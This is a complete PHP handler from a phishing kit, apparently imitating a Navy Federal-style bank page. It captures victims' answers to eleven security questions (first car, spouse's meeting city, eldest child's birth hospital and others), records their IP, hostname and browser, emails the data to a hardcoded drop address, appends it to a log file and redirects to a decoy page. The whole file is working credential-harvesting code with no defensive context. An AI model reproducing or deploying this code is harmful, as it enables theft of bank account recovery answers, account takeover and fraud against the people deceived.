<?php 
$Ok= "g.mumpy.1980@zohomail.eu"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Quest ==================\n";
$fuck .= "Question 1 Which state did you first visit (outside the one you were born in): ".$_POST['q1']."\n";
$fuck .= "Answer 1 : ".$_POST['a1']."\n";
$fuck .= "Question 2  : ".$_POST['q2']."\n";
$fuck .= "Answer 2 : ".$_POST['a2']."\n";
$fuck .= "Question 3 What is the first name of your eldest nephew/niece : ".$_POST['q3']."\n";
$fuck .= "Answer 3 : ".$_POST['a3']."\n";
$fuck .= "Question 4  : ".$_POST['q4']."\n";
$fuck .= "Answer 4 : ".$_POST['a4']."\n";
$fuck .= "Question 5 In what city did you meet your spouse : ".$_POST['q5']."\n";
$fuck .= "Answer 5 : ".$_POST['a5']."\n";
$fuck .= "Question 6  : ".$_POST['q6']."\n";
$fuck .= "Answer 6 : ".$_POST['a6']."\n";
$fuck .= "Question 7 What was the make of your first car : ".$_POST['q7']."\n";
$fuck .= "Answer 7 : ".$_POST['a7']."\n";
$fuck .= "Question 8  : ".$_POST['q8']."\n";
$fuck .= "Answer 8 : ".$_POST['a8']."\n";
$fuck .= "Question 9 What is your grandfather's profession? : ".$_POST['q9']."\n";
$fuck .= "Answer 9 : ".$_POST['a9']."\n";
$fuck .= "Question 10  : ".$_POST['q10']."\n";
$fuck .= "Answer 10 : ".$_POST['a10']."\n";
$fuck .= "Question 11 What is the name of the hospital your oldest child was born in : ".$_POST['q11']."\n";
$fuck .= "Answer 11 : ".$_POST['a11']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+harlie@mcarthy+===========\n";
$subject = "Naval Acces Num $ip";
{
$headers = "From: Allan <harlie@mcarthy>";
mail($Ok,$subject,$fuck,$headers);
$file = fopen("../nv.txt","a");
fwrite($file,$fuck);
fclose($file);

}

Header ("Location: red.htm");
?>